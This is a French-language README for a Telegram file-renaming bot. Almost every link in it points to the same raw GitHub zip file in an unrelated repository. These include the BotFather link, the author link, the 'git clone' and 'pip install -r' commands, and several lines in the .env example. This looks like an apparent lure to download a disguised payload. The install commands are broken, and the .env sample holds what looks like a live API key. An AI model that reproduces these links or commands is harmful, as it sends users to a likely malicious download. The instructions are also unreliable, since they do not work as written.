# autorename-Pro 🚀

**autorename-Pro** est un bot Telegram conçu pour renommer automatiquement les fichiers multimédias (documents, vidéos, audios) envoyés par les utilisateurs. Il permet également de trier les fichiers par saison et épisode, d'ajouter des métadonnées personnalisées, et de les envoyer dans un canal spécifique.

---

## Fonctionnalités ✨

- **Renommage automatique** : Renommez les fichiers selon un modèle personnalisé.
- **Tri par saison et épisode** : Triez les fichiers multimédias par saison et épisode.
- **Métadonnées personnalisées** : Ajoutez des métadonnées aux fichiers (titre, auteur, etc.).
- **Envoi dans un canal** : Envoyez les fichiers triés dans un canal spécifique.
- **Mode séquentiel** : Traitez les fichiers en mode séquentiel pour un meilleur contrôle.
- **Gestion des miniatures** : Ajoutez ou supprimez des miniatures personnalisées.
- **Commandes administrateur** : Gérez les utilisateurs, les bannissements et les statistiques du bot.

---

## Installation 🛠️

### Prérequis

- Python 3.8 ou supérieur
- Un token d'API Telegram (obtenez-le auprès de [BotFather](https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip))
- Un canal Telegram pour les logs (optionnel)

### Étapes

1. Clonez ce dépôt :
   ```bash
   git clone https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
   cd autorename-Pro
   ```
2. Installez les dépendances :
   ```bash
   pip install -r https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
   ```
3. Configurez les variables d'environnement :
   - Créez un fichier `.env` à la racine du projet et ajoutez-y :
     ```plaintext
     API_HASH=api_hash (https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip)
     API_ID=api_id (https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip)
     BOT_TOKEN=token_bot (botfather)
     DATA_URI=db_mogo_uri
     DATA_NAME=autotest
     TEMP_DIR=temp/
     DOWNLOAD_DIR=downloads/
     PORT=8080
     WEBHOOK=True (for web support)
     ADMIN=581XXXXXXX
     FORCE_SUB_CHANNELS=hyoshcoder
     CHANNEL_LOG=-1002175858455
     DUMP_CHANNEL=-1002175855655
     https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
     https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
     https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
     SHORTED_LINK_API=c6KVicXb34R3YbniioSNdYx1fBjjfjfo6J90n2
     https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
     ```
4. Démarrez le bot :
   ```bash
   python -m bot
   ```

---

## Utilisation 🎯

### Commandes disponibles

| Commande      | Emoji  | Description |
|--------------|--------|-------------|
| `/start`     | 🎮 | Démarrer le bot et afficher le message de bienvenue. |
| `/autorename` | 📝 | Définir un format de renommage automatique. |
| `/setmedia`  | 🎥 | Définir le type de média préféré (doc, vidéo, audio). |
| `/set_caption` | 📋 | Définir une légende personnalisée. |
| `/del_caption` | 🗑️ | Supprimer la légende personnalisée. |
| `/view_caption` | 👀 | Afficher la légende actuelle. |
| `/viewthumb` | 🎨 | Afficher la miniature actuelle. |
| `/del_thumb` | 🗑️ | Supprimer la miniature personnalisée. |
| `/metadata` | 📊 | Activer/désactiver les métadonnées. |
| `/donate` | 💸 | Soutenir le projet. |
| `/premium` | 🌟 | Voir les avantages premium. |
| `/plan` | 📅 | Voir les plans et tarifs. |
| `/bought` | ✅ | Vérifier l'état d'un achat. |
| `/help` | ℹ️ | Afficher ce message d'aide. |
| `/set_dump` | 👤 | Définir un canal de dump. |
| `/view_dump` | 👀 | Afficher le canal de dump actuel. |
| `/del_dump` | 🗑️ | Supprimer le canal de dump. |
| `/profile` | 👤 | Afficher le profil de l'utilisateur. |
| `/restart` | 🔄 | Redémarrer le bot (admin). |
| `/ban` | 🚫 | Bannir un utilisateur (admin). |
| `/unban` | ✅ | Débannir un utilisateur (admin). |
| `/banned_users` | 📚 | Afficher les utilisateurs bannis. |
| `/broadcast` | 📢 | Envoyer un message à tous (admin). |
| `/stats` | 📊 | Afficher les statistiques du bot (admin). |
| `/status` | 🟢 | Afficher l'état du bot (admin). |
| `/users` | 👥 | Afficher la liste des utilisateurs (admin). |

---

## Contribution 🤝

Les contributions sont les bienvenues ! Voici comment contribuer :

1. **Forkez** ce dépôt.
2. **Créez une branche** pour votre fonctionnalité :
   ```bash
   git checkout -b feature/nouvelle-fonctionnalité
   ```
3. **Committez vos changements** :
   ```bash
   git commit -m "Ajouter une nouvelle fonctionnalité"
   ```
4. **Poussez vers la branche** :
   ```bash
   git push origin feature/nouvelle-fonctionnalité
   ```
5. **Ouvrez une Pull Request**.

---

## Licence 📝

Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.

---

## Auteur 🤖

  [@Hyoshcoder](https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip)

---

## Remerciements 🙏

- **Pyrogram** - La bibliothèque Telegram utilisée pour ce projet.
- **Telegram** - Pour leur plateforme incroyable.

---

